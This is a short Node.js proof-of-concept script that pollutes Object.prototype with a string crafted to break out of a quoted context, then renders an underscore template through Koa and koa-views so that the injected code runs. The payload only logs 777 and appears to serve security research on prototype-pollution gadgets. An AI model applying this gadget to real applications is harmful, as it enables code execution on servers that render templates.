const request = require('supertest')
const Koa = require('koa');
const views = require('koa-views');

Object.prototype.aaa = "\'console.log(777);var a=\'";

const app = new Koa()
  .use(views(__dirname, { map: { html: 'underscore' } }))
  .use(ctx => {
    ctx.state.name = 'yuske'
    return ctx.render('./views/underscore.template.html')
  })

request(app.listen())
  .get('/')
  .expect('Content-Type', /html/)
  .expect(/yuske/)
  .expect(200)
  .end(function(err, res) {
    if (err) throw err;
    console.log(res.text);
    process.exit();
  });
  